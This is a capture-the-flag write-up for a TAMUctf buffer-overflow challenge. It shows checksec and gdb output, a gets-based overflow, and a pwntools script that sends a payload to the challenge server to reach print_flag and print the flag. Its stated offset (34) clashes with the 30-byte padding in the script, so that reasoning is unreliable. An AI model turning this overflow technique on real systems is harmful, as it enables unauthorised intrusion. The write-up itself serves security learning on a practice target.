## pwn2
#### Standard for all pwn challenges - we start a simple reconnaisance by using checksec
```
$ checksec pwn2
    Arch:     i386-32-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      PIE enabled
```
#### We get the same properties such as the previous pwn challenge. Starting the binary, we get a prompt which asks us which function to call:
```
$ ./pwn2
    Which function would you like to call?
```
#### It waits for user input, and if the user enters a valid function name, it executes that function, else it exits. But we don't really know which functions to call, so we fire up gdb and look at the disassembly of the binary.
```
$ gdb ./pwn2
    gdb-peda$ disas main
    Dump of assembler code for function main:
       [...]
       0x0000080d <+49>:	add    esp,0x10
       0x00000810 <+52>:	sub    esp,0xc
       0x00000813 <+55>:	lea    eax,[ebx-0x1670]
       0x00000819 <+61>:	push   eax
       0x0000081a <+62>:	call   0x500 <puts@plt>
       0x0000081f <+67>:	add    esp,0x10
       0x00000822 <+70>:	sub    esp,0xc
       0x00000825 <+73>:	lea    eax,[ebp-0x27]
       0x00000828 <+76>:	push   eax
       0x00000829 <+77>:	call   0x4e0 <gets@plt>
       0x0000082e <+82>:	add    esp,0x10
       0x00000831 <+85>:	sub    esp,0xc
       0x00000834 <+88>:	lea    eax,[ebp-0x27]
       0x00000837 <+91>:	push   eax
       0x00000838 <+92>:	call   0x77f <select_func>
       [...]
```
#### Interestingly enough, a ```gets``` call is executed to ask for the user input, which can be the entry point for our exploit. But another function to take note of is ```select_func``` which uses the buffer at ```[ebp-0x27]``` as the argument. Let's have a look at all the functions in the binary so we know what options are available for us to choose from:
```
gdb-peda$ info functions
    [...]
    0x000006ad  two
    0x000006d8  print_flag
    0x00000754  one
    0x0000077f  select_func
    0x000007dc  main
    [...]
```
#### We see the functions main and select func, which we already know by disassembling the main function of the binary. And we see the interesting functions, one, two, and print_flag: if we try to input these options in the prompt, maybe it'll give us the flag of the challenge.
```
$ ./pwn2
Which function would you like to call?
one
This is function one!

$ ./pwn2
two

$ ./pwn2
print_flag
```
#### Sadly, we get nothing out of it. We do want to be able to execute the print_flag function tho, as we know it prints the flag for us. Remember that the input uses ```gets``` to get user input? We can utilize that vulnerability to perform a buffer overflow into overwriting the ```eip``` register to point to the address of the ```print_flag``` function. Before we do that, we need to know the address of the function. We can do that using *objdump*:
```
$ objdump -M intel -d pwn2 | grep print_flag
    000006d8 <print_flag>:
        [...]
```
#### We take a note that ```print_flag```'s address is at ```0x000006d8```. Next thing we need to know is the exact size of the buffer to trigger the segmentation fault. Though the buffer is stored at address ```[ebp-0x27]``` which has a size of 39, the exact offset to overflow the buffer and overwrite the eip register is at offset 34. We can now create a short exploit script and send the result to the server to get the flag.
#### exploit.py
```
from pwn import *

#: Connect to challenge server
HOST = 'pwn.tamuctf.com'
PORT = 4322
conn = remote(HOST, PORT)

#: Exploit code
offset = 'A' * 30
eip = p32(0x000006d8)
exploit = offset + eip

#: Send data
print(conn.recvline())
conn.sendline(exploit)
print(conn.recvline())
print(conn.recvline())
```
### And the script returns us the flag!
```
$ python exploit.py

    Which function would you like to call?

    This function is still under development.

    gigem{4ll_17_74k35_15_0n3}
```
